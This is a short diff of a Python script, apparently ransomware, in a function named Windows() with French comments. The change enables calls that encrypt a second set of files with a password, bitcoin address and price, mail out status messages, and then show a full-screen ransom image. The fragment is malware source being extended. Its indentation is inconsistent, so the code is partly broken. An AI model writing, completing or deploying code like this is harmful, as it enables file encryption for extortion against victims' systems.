@@ -63,7 +63,7 @@ def Windows():
 
     #BOUCLE INFINIE
     continuer = 1
-
+    aff=0
     #Boucle infinie
         while continuer:
 	if aff==0:
@@ -84,8 +84,8 @@ def Windows():
 					mail(textexe)
     					crypt(text1, pwd, path, bitcoin, price,verif)
     					mail(textfin)
-					#crypt(text2, pwd, path, bitcoin, price,verif)
-					#mail(textall)               
+					crypt(text2, pwd, path, bitcoin, price,verif)
+					mail(textall)               
                         		nouveaufond = pygame.image.load("message.JPG").convert()
 					nouveaufond = pygame.transform.scale(nouveaufond, (640, 480))
                         		fenetre.blit(nouveaufond, (0,0))
